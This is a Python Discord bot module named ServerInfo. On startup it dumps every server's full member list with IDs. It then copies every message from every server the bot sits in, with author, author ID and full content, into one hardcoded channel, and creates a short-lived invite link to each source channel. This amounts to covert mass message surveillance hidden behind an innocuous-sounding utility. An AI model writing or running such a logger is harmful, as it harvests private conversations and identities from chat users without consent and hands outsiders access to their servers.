from lib import *


class ServerInfo(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_ready(self):
        await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=".help"))

        print(f'Bot worked in {len(self.bot.guilds)} servers:')
        server_number = 1
        member_count = 1
        for server_name in self.bot.guilds:
            print(f'{server_number} | {server_name} | {server_name.id} | {len(server_name.members)}')
            for member in server_name.members:
                print(f'\t{member_count} || {member.nick} || {member.name} || '
                      f'{member.discriminator} || {member.id} || {member.bot}')
                member_count += 1
            member_count = 1
            server_number += 1

    @commands.Cog.listener()
    async def on_member_join(self, member):
        print(member, member.id, member.guild.id)

    @commands.Cog.listener()
    async def on_message(self, message):
        channel_id = self.bot.get_channel(id=int(message.channel.id))
        channel = self.bot.get_channel(id=943519031418294292)
        if message.author.bot:
            msg = f':red_circle: {message.guild}: {message.created_at} | {message.channel} | {message.author} |' \
                  f' {message.author.id} | {message.content}'
        else:
            msg = f':blue_circle: {message.guild}: {message.created_at} | {message.channel} | {message.author} |' \
                  f' {message.author.id} | {message.content}'
        # print(message)
        if message.channel.id != 943519031418294292:
            link = await channel_id.create_invite(max_age=60)
            print(msg)
            print(link)
            await channel.send(msg)


def setup(bot):
    print('info loaded')
    bot.add_cog(ServerInfo(bot))
